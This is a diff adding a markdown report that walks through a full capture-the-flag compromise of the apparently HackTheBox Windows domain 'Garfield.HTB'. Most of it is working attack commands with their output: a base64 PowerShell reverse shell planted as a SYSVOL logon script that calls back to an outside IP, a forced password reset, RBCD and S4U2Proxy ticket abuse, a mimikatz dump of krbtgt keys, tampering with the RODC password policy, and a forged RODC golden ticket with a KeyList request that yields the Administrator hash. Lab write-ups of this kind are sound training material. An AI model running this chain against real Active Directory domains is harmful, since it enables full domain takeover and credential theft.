@@ -1,0 +1,255 @@
+# Garfield.HTB (Windows Hard) — Full Attack Report
+**Machine IP:** `10.129.244.207` (old `10.129.15.154` expired) — DC01 direct, RODC01 `192.168.100.2` via chisel pivot `127.0.0.1:1080`
+**Domain:** `garfield.htb` / `S-1-5-21-2502726253-3859040611-225969357`
+**Date:** 2026-10-08 / 2026-10-09 (DC 30h ahead, need faketime)
+**Creds start:** `j.arbuckle / Th1sD4mnC4t!@1978`
+
+---
+
+## 0. Recon
+
+**Result:**
+```
+PORT 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389 open
+DC01.garfield.htb — Windows Server 2019 Standard (10.0.17763)
+System_Time: 2026-10-09T20:32:38+00:00 (+1d08h vs Kali)
+RODC01 192.168.100.2 via chisel server -p 8889 --reverse
+```
+
+```bash
+nmap -sCV -A -Pn -p- -v --min-rate 5000 -oN nmap.txt 10.129.244.207
+ldapsearch -x -H ldap://10.129.244.207 -D "j.arbuckle@garfield.htb" -w 'Th1sD4mnC4t!@1978' -b "DC=garfield,DC=htb" | tee ldap.txt
+bloodhound.py -u j.arbuckle -p 'Th1sD4mnC4t!@1978' -d garfield.htb --host 10.129.244.207 -c All
+# -> 20261008090152_users.json (8), groups.json (55), computers.json (2, fix <p></p>), domains.json, etc.
+```
+
+**BloodHound mapping:**
+- `RODC01 (1602) → ForceChangePassword → KRBTGT_8245 (1603)` — in `users.json` target KRBTGT_8245 Aces PrincipalSID 1602
+- `L.WILSON_ADM (3107) → WriteAccountRestrictions + ForceChangePassword → RODC01 (1602)` — in `computers.json` target RODC01 Aces PrincipalSID 3107
+- `L.WILSON_ADM (3107) → MemberOf → TIER 1 (3108) → AddSelf → RODC ADMINISTRATORS (2101)` — in `groups.json`: TIER1 Members contains 3107, RODC ADMINISTRATORS Aces AddSelf PrincipalSID 3108
+- `L.WILSON (3105) → User-Force-Change-Password (GUID 00299570) → L.WILSON_ADM (3107)` — in `users.json` target L.WILSON_ADM Aces ForceChangePassword PrincipalSID 3105 (SharpHound resolves GUID to name)
+
+> ACEs live on TARGET object. `grep 00299570` finds nothing in json, only in raw `ldap.txt`.
+
+---
+
+## 💥 Phase 1 — scriptPath Abuse → Shell as l.wilson
+
+**Result:**
+```
+CN=Liz Wilson (l.wilson)         → scriptPath: WRITE (by j.arbuckle IT SUPPORT 3106)
+CN=Liz Wilson ADM (l.wilson_adm) → scriptPath: WRITE
+CN=krbtgt_8245                   → scriptPath: WRITE (ignored)
+CN=Jon Arbuckle (j.arbuckle)     → many attributes WRITE (self)
+```
+
+**`j.arbuckle` can ONLY write `scriptPath`** on `l.wilson` and `l.wilson_adm` — not ForceChangePassword. ACL on `l.wilson_adm` shows SID `-3105` (= `l.wilson`) has ForceChangePassword. Path: **scriptPath abuse on l.wilson → shell as l.wilson → l.wilson changes l.wilson_adm password**.
+
+→ **[[ad_manual_attacks]]** — sección scriptPath via SYSVOL
+
+**Why target `printerDetect.bat`:** SYSVOL already contained `printerDetect.bat`. Replacing it AND assigning as `l.wilson` scriptPath ensures bot periodic logon triggers payload.
+
+```bash
+# Step 1 — PowerShell reverse shell Base64
+PAYLOAD='$client = New-Object System.Net.Sockets.TCPClient("10.10.14.217",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+B64=$(echo -n $PAYLOAD | iconv -t UTF-16LE | base64 -w 0)
+cat > /tmp/printerDetect.bat << EOF
+@echo off
+powershell -enc $B64
+EOF
+
+# Step 2 — Upload to SYSVOL
+smbclient //10.129.244.207/SYSVOL -U "garfield.htb/j.arbuckle%Th1sD4mnC4t!@1978" -c 'cd garfield.htb\scripts; put /tmp/printerDetect.bat printerDetect.bat'
+
+# Step 3 — Assign scriptPath
+bloodyAD -u j.arbuckle -p 'Th1sD4mnC4t!@1978' -d garfield.htb --host 10.129.244.207 set object "CN=Liz Wilson,CN=Users,DC=garfield,DC=htb" scriptPath -v printerDetect.bat
+
+# Step 4 — Listen
+nc -lvnp 4444
+```
+**Shell as `garfield\l.wilson`** ✅
+
+### Lateral l.wilson → l.wilson_adm
+`l.wilson` has `User-Force-Change-Password` over `l.wilson_adm`.
+
+```powershell
+# As l.wilson on DC01:
+$newpass = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+Set-ADAccountPassword -Identity l.wilson_adm -NewPassword $newpass -Reset
+```
+**Why `net user` fails:** needs current password. `Set-ADAccountPassword -Reset` uses AD API bypass.
+
+```bash
+evil-winrm -i 10.129.244.207 -u l.wilson_adm -p 'Password123!'
+# PSRemoteUsers on DC01 = 3105,3107 verified in computers.json
+```
+
+---
+
+## 💥 Phase 2 — Add Computer + RBCD to RODC01
+
+```bash
+# Any user can add computer (MachineAccountQuota: 10)
+impacket-addcomputer 'garfield.htb/j.arbuckle:Th1sD4mnC4t!@1978' -dc-ip 10.129.244.207 -computer-name 'ATTACKER$' -computer-pass 'Password123!'
+# ATTACKER$ SID ...-11101 created, AES256 = 6a8036e638cb174919baf0be567bf6898ced6f2cacc5d4e6746b9ae62804eee8 (salt GARFIELD.HTBhostattacker.garfield.htb)
+
+# As l.wilson_adm (Write over RODC01) write RBCD
+impacket-rbcd 'garfield.htb/l.wilson_adm:Password123!' -delegate-to 'RODC01$' -delegate-from 'ATTACKER$' -action write -dc-ip 10.129.244.207
+impacket-rbcd 'garfield.htb/l.wilson_adm:Password123!' -delegate-to 'RODC01$' -action read -dc-ip 10.129.244.207
+# [*] ATTACKER$ (S-1-5-21-...-11101) allowed ✅
+
+# TIER1 AddSelf abuse (already done, verified)
+bloodyAD ... get object "CN=RODC ADMINISTRATORS,CN=Users,DC=garfield,DC=htb" --attr member
+# member: CN=Liz Wilson ADM ✅
+```
+
+**Why RBCD:** `l.wilson_adm` has no GenericWrite for RBCD? Actually `WriteAccountRestrictions` + ownership via TIER1 path allows `msDS-AllowedToAct` write. Verified read shows ATTACKER$.
+
+---
+
+## 💥 Phase 3 — Clock Skew + Proxychains Fix + S4U2Proxy
+
+**Result:**
+```
+KRB_AP_ERR_SKEW — Kali Oct8 14:20 UTC vs DC Oct9 18:34 UTC (+115707s, ntpdate -q)
+Strict chain ... 127.0.0.1:9050 ... timeout — /etc/proxychains.conf overwritten to 1 line
+```
+
+```bash
+# proxychains must be dynamic + 1080, not strict + 9050
+sudo sed -i 's/^strict_chain/#strict_chain/; s/^#dynamic_chain/dynamic_chain/; s/^socks4.*9050/#socks4 127.0.0.1 9050/' /etc/proxychains.conf
+# use custom without sudo:
+cat > /tmp/proxychains-1080.conf <<'EOF'
+strict_chain
+proxy_dns
+tcp_read_time_out 15000
+tcp_connect_time_out 8000
+[ProxyList]
+socks5 127.0.0.1 1080
+EOF
+# chisel 127.0.0.1:1080 OK (pid 177890 server -p 8889 --reverse)
+proxychains4 -f /tmp/proxychains-1080.conf nmap -sT -Pn -n -p 445,5985 192.168.100.2
+
+# No sudo to ntpdate → compile faketime in /tmp (no root needed)
+git clone --depth 1 https://github.com/wolfcw/libfaketime.git /tmp/libfaketime; make -C /tmp/libfaketime -j4
+DC_TIME=$(net time -S 10.129.244.207); DC_FMT=$(date -u -d "$DC_TIME" "+%Y-%m-%d %H:%M:%S")
+
+# ATTACKER$ AES (computed, matches -aesKey in logs)
+# NT 2b576acbe6bcfda7294d6bd18041b8fe, aes256 6a8036e638cb174919baf0be567bf6898ced6f2cacc5d4e6746b9ae62804eee8
+
+# Get S4U2Proxy ticket (AES forces AES256, RODC rejects RC4 STATUS_MORE_PROCESSING_REQUIRED)
+export LD_PRELOAD=/tmp/libfaketime/src/libfaketime.so.1; export FAKETIME="@$DC_FMT"; export FAKETIME_NO_CACHE=1
+impacket-getST -aesKey 6a8036e638cb174919baf0be567bf6898ced6f2cacc5d4e6746b9ae62804eee8 -dc-ip 10.129.244.207 -spn cifs/RODC01.garfield.htb -impersonate Administrator 'garfield.htb/ATTACKER$'
+# Saving ticket in Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache ✅
+export KRB5CCNAME=/home/victor/Desktop/Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache
+```
+
+**Why AES required:** Default getST uses NT hash → RC4. RODC rejects RC4.
+
+---
+
+## 💥 Phase 4 — SYSTEM on RODC01 + Mimikatz Dump
+
+```bash
+# wmiexec -k needs faketime + proxy combined (LD_PRELOAD both libs, no proxychains binary)
+export LD_PRELOAD=/tmp/libfaketime/src/libfaketime.so.1:/usr/lib/x86_64-linux-gnu/libproxychains.so.4
+export PROXYCHAINS_CONF_FILE=/tmp/proxychains-1080.conf
+impacket-wmiexec -k -no-pass -dc-ip 10.129.244.207 -target-ip 192.168.100.2 Administrator@RODC01.garfield.htb whoami
+# garfield\administrator ✅ (psexec fails pipe-broken over chisel, wmiexec stable)
+
+# Upload mimikatz (1.3M) via smbclient -k
+# do_put takes single arg!
+cat > /tmp/smb_put.txt <<'EOF'
+use C$
+cd Windows/Temp
+put /tmp/mimikatz.exe
+ls
+exit
+EOF
+impacket-smbclient -k -no-pass -dc-ip 10.129.244.207 -target-ip 192.168.100.2 Administrator@RODC01.garfield.htb -inputfile /tmp/smb_put.txt
+# mimikatz.exe 1355264 ✅
+
+impacket-wmiexec ... 'C:\Windows\Temp\mimikatz.exe "privilege::debug" "lsadump::lsa /inject /name:krbtgt_8245" exit'
+```
+
+**Output:**
+```
+User : krbtgt_8245 (RID 1603)
+NTLM : 445aa4221e751da37a10241d962780e2
+aes256_hmac (4096) : d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240
+aes128 : 124c0fd09f5fa4efca8d9f1da91369e5
+Salt : GARFIELD.HTBkrbtgt_8245
+User : RODC01$
+NTLM : 0a3f810964bb5e1f0e52245f73700172
+aes256 (4096) : 53f207641615eef3b3235d9b2ee9dfa47dcec7c05d46393958031eaee42eda22
+Salt : GARFIELD.HTBhostrodc01.garfield.htb
+```
+
+---
+
+## 💥 Phase 5 — PRP Modify (CRITICAL)
+
+**Problem:** `msDS-NeverRevealGroup` contains `CN=Administrators`. KDC rejects Key-List for Administrator with `KDC_ERR_TGT_REVOKED` even though Administrator in RevealedUsers historically.
+
+```bash
+# As l.wilson_adm (WriteAccountRestrictions on RODC01) via bloodyAD (NTLM, no time needed)
+bloodyAD -d garfield.htb -u l.wilson_adm -p 'Password123!' -H DC01.garfield.htb -i 10.129.244.207 get object "CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb" --attr msDS-NeverRevealGroup,msDS-RevealOnDemandGroup
+# NeverReveal: Denied...; Account Operators; Server Operators; Backup Operators; Administrators
+# RevealOnDemand: Allowed...
+
+bloodyAD ... set object "CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb" msDS-RevealOnDemandGroup -v "CN=Allowed RODC Password Replication Group,CN=Users,DC=garfield,DC=htb" -v "CN=Administrator,CN=Users,DC=garfield,DC=htb" --bak
+bloodyAD ... set object "CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb" msDS-NeverRevealGroup --bak
+# verify empty ✅
+```
+
+---
+
+## 💥 Phase 6 — RODC Golden + KeyList → Administrator
+
+**Why Rubeus v2.3.3+:** `/rodcNumber` in `golden` + `/keyList` in `asktgs` only in master. Kali deb 1.6.4 too old. Built from source with net40 ref without sudo:
+```bash
+git clone --depth 1 https://github.com/GhostPack/Rubeus.git /tmp/Rubeus-src
+wget -q https://www.nuget.org/api/v2/package/Microsoft.NETFramework.ReferenceAssemblies.net40/1.0.0 -O /tmp/net40.nupkg; unzip -q /tmp/net40.nupkg -d /tmp/net40
+dotnet build /tmp/Rubeus-src/Rubeus/Rubeus.csproj -c Release -o /tmp/Rubeus-built -p:FrameworkPathOverride=/tmp/net40/build/.NETFramework/v4.0
+# -> /tmp/Rubeus-built/Rubeus.exe 463K ✅ rodcNumber + keyList
+python3 -m http.server 8000 --directory /tmp/Rubeus-built &
+nxc winrm 10.129.244.207 -u l.wilson_adm -p 'Password123!' -d garfield.htb -X 'IWR http://10.10.14.217:8000/Rubeus.exe -OutFile C:\Users\l.wilson_adm\Documents\Rubeus.exe; dir ...\Rubeus.exe'
+# 474112 ✅ (evil-winrm ruby 3.9 broken, use nxc winrm -X powershell)
+```
+
+```powershell
+# On DC01 via nxc winrm -X (powershell, Pwn3d!)
+C:\Users\l.wilson_adm\Documents\Rubeus.exe golden /rodcNumber:8245 /aes256:d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240 /user:Administrator /id:500 /domain:garfield.htb /sid:S-1-5-21-2502726253-3859040611-225969357 /nowrap
+# Forged TGT doIFkjCCBY6gAwIBB... (1908 chars)
+
+C:\Users\l.wilson_adm\Documents\Rubeus.exe asktgs /keyList /service:krbtgt/garfield.htb /dc:DC01.garfield.htb /ticket:doIFkj... /nowrap
+# [+] TGS request successful!
+# Base64(key): 3WhjPRrSfHdcH98xqtAdFvGbDP3tvDBuJFdeDN5m+e8=
+# Password Hash: EE238F6DEBC752010428F20875B092D5
+```
+
+**Why works now:** Ticket signed with krbtgt_8245 key. DC checks PRP — we cleared NeverReveal + allowed Administrator, so returns full creds via Key-List.
+
+---
+
+## 💥 Phase 7 — Root
+
+```bash
+nxc winrm 10.129.244.207 -u Administrator -H EE238F6DEBC752010428F20875B092D5 -d garfield.htb -X 'whoami; hostname; type C:\Users\Administrator\Desktop\root.txt'
+# garfield\administrator, DC01, 79e19bd1c59e5463f41e6e3cc531ef1d
+evil-winrm -i 10.129.244.207 -u Administrator -H EE238F6DEBC752010428F20875B092D5
+```
+
+**Flags:**
+```
+C:\Users\l.wilson_adm\Desktop\user.txt → d620a8856353a7d38cd5f45d7e2f1b71
+C:\Users\Administrator\Desktop\root.txt → 79e19bd1c59e5463f41e6e3cc531ef1d
+```
+
+**Cleanup (optional):**
+```bash
+impacket-addcomputer 'garfield.htb/j.arbuckle:Th1sD4mnC4t!@1978' -dc-ip 10.129.244.207 -computer-name 'ATTACKER$' -delete
+# restore PRP with --bak commands printed by bloodyAD
+```
+
+**Files in this dir:** `nmap.txt`, `ldap.txt`, `20261008090152_*.json` (fix computers.json `<p></p>`), `garfield.txt` (notes), `chisel.exe`, this report.
